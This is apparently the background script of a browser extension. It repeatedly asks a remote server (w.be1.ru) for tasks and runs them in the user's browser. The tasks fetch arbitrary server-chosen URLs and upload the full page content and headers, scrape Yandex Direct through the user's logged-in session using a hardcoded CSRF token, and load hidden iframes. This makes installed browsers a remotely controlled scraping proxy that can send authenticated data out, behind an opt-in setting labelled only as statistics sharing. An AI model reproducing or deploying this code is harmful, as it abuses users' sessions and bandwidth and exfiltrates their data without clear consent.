import { getConfig } from "./functions.js";
String.prototype.decodeEscapeSequence = function () {
    return this.replace(/\\x([0-9A-Fa-f]{2})/g, function () {
        return String.fromCharCode(parseInt(arguments[1], 16));
    });
};
var Worker = {
    id: null,
    host: 'w.be1.ru',
    //host: 'w.be1.ru:8080',
    //host: "localhost:8080",
    //host: "be1worker.local",
    delay: 1000,

    lastRequest: 0,
    watchTimeout: 0,

    waitForTask: function () {
        if (Worker.watchTimeout) {
            clearTimeout(Worker.watchTimeout);
            Worker.watchTimeout = 0;
        }
        setTimeout(function () {
            getConfig(function (config) {
                if (config.share_statistic) {
                    Worker.lastRequest = parseInt(Date.now() / 1000);
                    fetch(
                        "http://" + Worker.host + "/task/get?" + Worker.getQueryString()
                    ).then(response => response.json()).then(function (json) {
                        if (json.delay) Worker.delay = json.delay;
                        if (json.host) Worker.host = json.host;
                        if (json.wid) Worker.id = json.wid;
                        if (json.task != null) {
                            Worker.watch();
                            Worker.executeTask(json.task);
                        }
                        else
                            Worker.waitForTask();
                    }).catch((error) => {
                        //console.error("Error:", error);
                        Worker.waitForTask();
                    });

                } else {
                    Worker.waitForTask();
                }
            })
        }, Worker.delay);
    },
    rr: 1,
    escaped_one_to_xml_special_map: {
        '&amp;': '&',
        '&quot;': '"',
        '&lt;': '<',
        '&gt;': '>'
    },
    decodeXml: function (string) {
        return string.replace(/(&quot;|&lt;|&gt;|&amp;)/g,
            function (str, item) {
                return Worker.escaped_one_to_xml_special_map[item];
            });
    },

    executeTask: function (task) {
        //console.log("start", task)
        function executeTask_callback(result) {
            var complete = result === false ? 0 : 1;
            fetch(
                "http://" +
                Worker.host +
                "/task/save-result?" +
                Worker.getQueryString({ tid: task.id, complete, time: new Date().getTime(), ind: Worker.rr++ }),
                {
                    method: "POST",
                    body: JSON.stringify({
                        id: task.id,
                        type_id: task.main_type_id ? task.main_type_id : task.type_id,
                        arguments: task.arguments,
                        result: result
                    }),
                }
            ).then(response => {
                //response.json().then((data) => {
                //    console.log("Success:", data);
                //})
                Worker.waitForTask();
            }).catch((error) => {
                //console.error("Error:", error);
                Worker.waitForTask();
            });
        }
        var taskFunc = "task_" + task.type_id;
        if (Worker[taskFunc]) {
            Worker[taskFunc](task.arguments, executeTask_callback, task);
        } else {
            Worker.waitForTask();
        }
    },

    watch: function () {
        Worker.watchTimeout = setTimeout(function () {
            let now = parseInt(Date.now() / 1000);
            let last = Worker.lastRequest;

            if (last && now - last > 300) {
                Worker.waitForTask();
            }
        }, 300000);
    },

    getQueryString: function (params) {
        if (!params) {
            params = {
                v: encodeURIComponent("e." + chrome.runtime.getManifest().version),
            };
        }

        if (Worker.id) {
            params.wid = Worker.id;
        }

        return Object.keys(params)
            .map(function (key) {
                return key + "=" + encodeURIComponent(params[key]);
            })
            .join("&");
    },

    /* HELPERS */
    /* ----------------------------------- */

    load: function (opts, callback) {
        if (!opts.method) opts.method = "GET";
        if (!opts.headers) opts.headers = {};
        if (!opts.timeout) opts.timeout = 60000;
        const controller = new AbortController();
        const id = setTimeout(() => controller.abort(), opts.timeout);
        let ajaxOpts = {
            method: opts.method,
            data: opts.data,
            headers: opts.headers,
        };
        fetch(opts.url, ajaxOpts).then((response) => callback(response));
        clearTimeout(id);
    },

    log: function (info) {
        if (typeof info === "object") {
            info = JSON.stringify(info);
        }

        $.post("http://" + Worker.host + "/log", { info }, function () { });
    },

    messageHandler: function (message, sender, sendResponse) {
        if (typeof message != "object" || !message.be1_worker_command) return;

        let command = message.be1_worker_command;

        if (command == "task_6_result") {
            Worker.task_6_result = message.result;
            return sendResponse("tnx");
        }

        sendResponse({ error: "unknown command" });
    },

    task_7: function (args, callback, task) {
        let start_time = new Date().getTime();
        fetch(args.url).then(async function (xhr) {
            let result = {
                status: xhr.status,
                statusText: xhr.statusText,
                time: xhr.time,
                url: xhr.url,
                content: null,
            };
            // result  => error_page, new_url, OK
            var checks = [];
            if (!task.check || !Array.isArray(task.check)) {
                task.check = [];
            }
            var add_type = "start";
            if (task.check_add) {
                add_type = task.check_add;
            }
            switch (add_type) {
                case "end":
                    Array.prototype.push.apply(checks, task.check);
                    checks = checks;
                    break;
                case "del":
                    checks = [];
                    break;
                case "replace": checks = task.check;
                    break;
                case "start":
                default:
                    Array.prototype.push.apply(task.check, checks);
                    checks = task.check;
                    break;
            }
            var content = await xhr.text();
            var url = false;
            var action = "OK";
            checks.every((t) => {
                try {
                    var sourcestring = (t.content == "url") ? xhr.url : content;
                    var re = new RegExp(t.re);
                    var matches = re.exec(sourcestring);
                    if (matches) {
                        switch (t.result) {
                            case "new_url":
                                url = matches.groups.url;
                                t.postprocess.split(',').forEach((k) => {
                                    if (k == "decodeXml")
                                        url = Worker.decodeXml(url);
                                    else if (k == "decodeEscapeSequence")
                                        url = url.decodeEscapeSequence();
                                })
                                if (url.startsWith("/")) {
                                    var or = new URL(xhr.url);
                                    url = or.origin + url;
                                }
                                action = "new_url";
                                break;
                            case "error_page":
                                action = "error_page";
                                break;
                            default:
                                break;
                        }
                        return false;
                    }
                }
                catch (err) {
                    //console.log(err)
                }; return true;
            });
            try {
                switch (action) {
                    case "new_url":
                        args.url = url;
                        return Worker.task_7(args, callback);
                    case "error_page":
                        return callback(false);
                }
                result.headers = {};
                for (let entry of xhr.headers.entries()) {
                    result.headers[entry[0]] = entry[1];
                }

                result.url = xhr.url;
                result.time = new Date().getTime() - start_time;
                result.content = content;
                return callback(result);
            }
            catch (err) {

            };
        }).catch((err) => {
            return callback(false);
        });
    },
    /* REGISTERED TASKS */
    /* ----------------------------------- */
    task_3: function (args, callback) {
        let start_time = new Date().getTime();
        let result = false;
        try {
            fetch(args.url)
                .then((xhr) => {
                    let result = {
                        status: xhr.status,
                        statusText: xhr.statusText,
                        time: xhr.time,
                        url: xhr.responseURL,
                        content: null,
                    };
                    if (args.responseHeaders) {
                        result.headers = {};
                        for (let entry of xhr.headers.entries()) {
                            result.headers[entry[0]] = entry[1];
                        }
                    }
                    result.url = xhr.url;
                    result.time = new Date().getTime() - start_time;
                    if (args.statusOnly) {
                        result.content = null;
                        return callback(result);
                    } else
                        xhr.text().then((t) => {
                            result.content = t;
                            return callback(result);
                        });
                })
                .catch((err) => {
                    return callback(false);
                });
        } catch (error) {
            return callback(false);
        }
    },

    getBase64ImageFromUrl: async function (imageUrl) {
        var res = await fetch(imageUrl);
        var blob = await res.blob();

        return new Promise((resolve, reject) => {
            var reader = new FileReader();
            reader.addEventListener(
                "load",
                function () {
                    resolve(reader.result);
                },
                false
            );

            reader.onerror = () => {
                return reject(this);
            };
            reader.readAsDataURL(blob);
        });
    },

    task_4: function (args, callback) {
        Worker.getBase64ImageFromUrl(
            "https://www.yandex.ru/cycounter?" + args.domain
        )
            .then((base64) => {
                if (!base64.length) {
                    return callback(false);
                }

                return callback({ img: base64 });
            })
            .catch((err) => {
                // console.error(err)
                return callback(false)
            });
    },

    task_5: function (args, callback) {
        var queries = [];

        for (let i = 0; i < args.queries.length; i++) {
            let baseText = args.queries[i]
                .replace(/["\[\]]/g, " ")
                .replace(/\s+/g, " ");

            let words = baseText.split(" ").map(function (w) {
                return "!" + w.replace("!", "");
            });
            queries.push({
                text: args.queries[i],
                wordstat: {
                    base: { text: baseText, value: false },
                    strict: { text: '"' + baseText.replace("+", "") + '"', value: false },
                    strict2: {
                        text: '"' + words.join(" ").replace("+", "") + '"',
                        value: false,
                    },
                },
            });
        }

        let query_variants = [];

        for (let i = 0; i < queries.length; i++) {
            for (let type in queries[i].wordstat) {
                query_variants.push(queries[i].wordstat[type].text);
            }
        }
        let h = new Headers();
        h.append("origin", "https://direct.yandex.ru");
        h.append("accept", "application/json, text/javascript, */*; q=0.01");
        h.append("content-type", "application/json; charset=utf-8");
        h.append("x-requested-with", "XMLHttpRequest");

        let req = new Request("https://direct.yandex.ru/registered/main.pl", {
            method: "POST",
            body: JSON.stringify({
                csrf_token: "RRVt3mXkmGgfA7_B",
                cmd: "ajaxDataForNewBudgetForecast",
                advanced_forecast: "yes",
                period: "month",
                period_num: 0,
                phrases: query_variants.join(","),
                json_minus_words: "[]",
                geo: args.regions.join(","),
                unglue: 1,
                fixate_stopwords: 1,
                currency: "RUB",
            }),
            credentials: "same-origin",
            referrer: "https://direct.yandex.ru/",
            credentials: "include",
            headers: h
        })


        fetch(req).then(xhr => {
            if (xhr.status == 0 && xhr.statusText == "error") {
                throw new Error("xhr.status error")
            }
            else
                return xhr.json();
        }).then(json => {
            if (typeof json != "object") {
                return callback(false);
            }

            if (json.error) {
                return callback({ error: json.error });
            }
            for (let i = 0; i < queries.length; i++) {
                for (let type in queries[i].wordstat) {
                    let md5 = json.phrase2key[queries[i].wordstat[type].text];

                    if (md5) {
                        for (let j = 0; j < json.data_by_positions.length; j++) {
                            if (json.data_by_positions[j].md5 == md5) {
                                queries[i].wordstat[type].value =
                                    json.data_by_positions[j].shows;
                            }
                        }
                    }
                }
            }
            callback(queries);
        }).catch(err => {
            return callback(false)
        });
    },

    task_6: function (args, callback) {
        Worker.task_6_result = null;

        var frame = $(
            '<iframe src="' +
            args.url +
            '" width="1366" height="768" class="sw-frame"></iframe>'
        ).appendTo("body");
        var intervalCounter = 0;

        var interval = setInterval(function () {
            if (Worker.task_6_result !== null) {
                clearInterval(interval);
                frame.remove();
                callback({ data: Worker.task_6_result });
                return;
            }

            if (++intervalCounter > 160) {
                // 8 sec
                clearInterval(interval);
                frame.remove();
                callback(false);
            }
        }, 50);
    },
};

// Init message handler
chrome.runtime.onMessage.addListener(Worker.messageHandler);
// Run worker
Worker.waitForTask();
